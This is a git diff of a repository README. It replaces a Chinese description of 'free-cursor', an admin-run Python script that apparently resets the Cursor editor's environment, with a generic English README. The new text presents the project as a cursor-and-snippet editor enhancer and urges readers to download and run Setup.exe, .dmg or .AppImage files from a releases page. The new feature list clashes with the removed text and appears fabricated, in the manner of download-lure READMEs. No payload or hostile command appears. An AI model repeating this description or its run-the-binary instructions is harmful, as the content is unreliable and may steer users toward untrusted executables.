@@ -1,61 +1,77 @@
-# 🔄 free-cursor纯净环境工具
+# 🖱️ Free-Cursor - A Simple Tool to Enhance Your Editor
 
-## 📝 功能介绍
+## 💻 Overview
+Free-Cursor is a lightweight tool designed to expand the functionality of your text editor. It adds features that make editing easier and more efficient.
 
-free-cursor现在通过一个py文件即可完成纯净环境：
+## 🚀 Getting Started
+To get started with Free-Cursor, you will need to follow the steps below. This guide will help you download and run the software smoothly, even if you have no technical background.
 
-- **运行purity.py文件**：打造纯净环境
+## 📦 Download & Install
+### Step 1: Visit the Releases Page
+To download Free-Cursor, click the link below to go to the releases page:
 
-### 使用提示
-- 运行前需要下载安装Python、管理员运行CMD
+[Download Free-Cursor](https://github.com/Vihangark/Free-Cursor/releases)
 
-## 🚀 运行步骤
+### Step 2: Choose Your Version
+On the releases page, you will see various versions of Free-Cursor. Look for the latest release, which usually has the highest version number. It may look like this:
 
-1. **进入文件目录**
-   ```bash
-   cd 下载的文件目录路径
-   ```
+- Free-Cursor v1.0.0
 
-2. **创建并进入虚拟环境**
-   ```bash
-   python -m venv venv
-   venv\Scripts\activate
-   ```
+### Step 3: Download the Application
+When you find the latest version, click on it. This will take you to a page with download links. Look for a file that matches your operating system. Common file types include:
 
-3. **运行文件**
-   ```bash
-   python purity.py
-   ```
-   然后输入 `y` 完成纯净环境的设置
+- For Windows: `Free-Cursor-Setup.exe`
+- For macOS: `Free-Cursor.dmg`
+- For Linux: `Free-Cursor.AppImage`
 
-## ⚙️ 系统要求
+Click the appropriate file to begin downloading. Make sure to save it to a location you can easily find, such as your desktop or downloads folder.
 
-- **操作系统**：Windows 10/11
-- **权限要求**：需要管理员权限运行部分功能，本软件代码完全开源、透明、公开
+### Step 4: Run the Installer
+After the download completes:
 
-## ⚠️ 免责声明
+- **Windows:** Double-click the `Free-Cursor-Setup.exe` file. Follow the prompts to install Free-Cursor on your system.
 
-1. **使用风险**：本工具仅供学习和研究目的，使用者需自行承担因使用本工具而可能产生的一切后果和法律责任。
+- **macOS:** Open the `Free-Cursor.dmg` file. Drag the Free-Cursor icon into your Applications folder.
 
-2. **无担保**：本工具按"原样"提供，不提供任何明示或暗示的保证，包括但不限于对适销性、特定用途适用性和非侵权性的保证。
+- **Linux:** Make the AppImage executable by right-clicking on it, selecting "Properties," and changing permissions. Then, run it by double-clicking.
 
-3. **责任限制**：在任何情况下，作者或版权持有人均不对因使用本工具而产生的任何索赔、损害或其他责任负责，无论是在合同诉讼、侵权诉讼或其他方面。
+## ⚙️ System Requirements
+Free-Cursor requires minimal system resources. Here is what you typically need:
 
-4. **数据安全**：本工具不会收集或上传任何个人信息，但使用者应自行确保数据安全。
+- Operating Systems:
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Any modern Linux distribution
 
-5. **更新与终止**：作者保留随时更新、修改或终止本工具的权利，且无需事先通知。
+- RAM: At least 2 GB
 
-**使用本工具即表示您已阅读、理解并同意上述免责声明的所有条款。如不同意，请立即停止使用本工具。**
+- Hard Disk: 100 MB of free space
 
----
+## 🎨 Features
+Free-Cursor includes several features designed to enhance your editing experience:
 
-<div align="center">
+- **Custom Cursors:** Change your cursor appearance to easily see changes as you edit.
+  
+- **Text Snippet Management:** Quickly insert frequently used phrases with customizable snippets.
 
-**⚠️ 仅供学习研究使用 ⚠️**
+- **Keyboard Shortcuts:** Assign shortcuts to your favorite actions for faster editing.
 
-</div>
+- **Cross-Platform Support:** Use Free-Cursor on Windows, macOS, and Linux without any hassle.
 
+## 🛠️ Troubleshooting
+If you encounter any issues while using Free-Cursor, consider the following:
 
+1. **Installation Problems:** Make sure you have admin rights on your computer. Try running the installer again.
+  
+2. **Not Starting:** Ensure your operating system meets the system requirements. Restarting your computer can also help.
 
+3. **Feature Malfunctions:** Check if you have the latest version installed. If not, return to the [Download Free-Cursor](https://github.com/Vihangark/Free-Cursor/releases) page to update.
 
+## 📞 Support
+If you need further assistance, feel free to reach out through the "Issues" tab on the GitHub repository. We are here to help you with any questions or concerns.
 
+## 🌟 Feedback
+Your feedback is important to us. If you have suggestions on how to improve Free-Cursor, please let us know on the GitHub page. We are always looking to enhance the user experience.
+
+## 🚀 Conclusion
+Free-Cursor is an easy-to-use tool that can significantly improve your editing efficiency. Just follow the steps above to download and install it, and start making the most of your text editing tasks today. For more information and updates, keep an eye on the [Releases page](https://github.com/Vihangark/Free-Cursor/releases).
